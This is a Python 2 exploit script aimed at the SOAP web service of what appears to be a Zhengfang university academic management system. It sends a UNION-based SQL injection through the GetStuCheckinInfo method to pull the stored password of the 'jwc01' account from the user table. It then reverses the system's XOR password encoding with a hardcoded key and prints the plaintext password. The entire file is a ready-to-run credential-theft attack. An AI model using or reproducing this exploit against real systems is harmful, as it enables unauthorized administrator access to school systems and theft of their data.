import urllib2 
import sys, httplib , re
def SendRtx(target,username): 
    SENDTPL = '''<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:tns="http://tempuri.org/" xmlns:types="http://tempuri.org/encodedTypes" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body soap:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
    <q1:GetStuCheckinInfo xmlns:q1="http://www.zf_webservice.com/GetStuCheckinInfo">
      <xh xsi:type="xsd:string">222222' union select Null,kl,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null from yhb where yhm='%s</xh>
      <xnxq xsi:type="xsd:string">2013-2014-1</xnxq>
      <strKey xsi:type="xsd:string">KKKGZ2312</strKey>
    </q1:GetStuCheckinInfo>
  </soap:Body>
</soap:Envelope>''' 
    SoapMessage = SENDTPL % (username) 
    webservice = httplib.HTTP(target) 
    webservice.putrequest("POST", "/service.asmx") 
    webservice.putheader("Host", target) 
    webservice.putheader("User-Agent", "Python Post") 
    webservice.putheader("Content-type", "text/xml; charset=\"UTF-8\"") 
    webservice.putheader("Content-length", "%d" % len(SoapMessage)) 
    webservice.putheader("SOAPAction", "\"http://www.zf_webservice.com/GetStuCheckinInfo \"") 
    webservice.endheaders() 
    webservice.send(SoapMessage) 
    # get the response 
    statuscode, statusmessage, header = webservice.getreply() 
    #print "Response: ", statuscode, statusmessage 
    #print "headers: ", header 
    return re.findall(u"(?<=\<xh xsi\:type=\"xsd:string\"\>).*?(?=\</xh\>)",webservice.getfile().read(),re.DOTALL)[0] 
    

def crack_zhengfang( pwdhash, key="Encrypt01" ):
    len_passwd = len( pwdhash )
    len_key = len( key )
    pwdhash = pwdhash[: len_passwd/2][::-1] + pwdhash[len_passwd/2 :][::-1]
    passwd = ''
    Pos = 0
    for i in xrange( len_passwd ):
        Pos %= len_key
        Pos += 1
        strChar = pwdhash[i] 
        KeyChar = key[Pos-1]
        ord_strChar = ord( strChar )
        ord_KeyChar = ord( KeyChar )
        if not 32 <= ( ord_strChar ^ ord_KeyChar ) <= 126 or not 0 <= ord_strChar <= 255:
            passwd += strChar
        else:
            passwd += chr( ord_strChar ^ ord_KeyChar )
    return passwd
def getIp(domain):
    import socket
    myaddr = socket.getaddrinfo(domain,'http')[0][4][0]
    return myaddr


if __name__ == '__main__':
    if len(sys.argv) != 2:
        print "Usage: zfsql.py URL"
        sys.exit(1)
    else:
        print "Password:", crack_zhengfang( pwdhash=SendRtx(getIp(sys.argv[1]),"jwc01"), key="Encrypt01" )
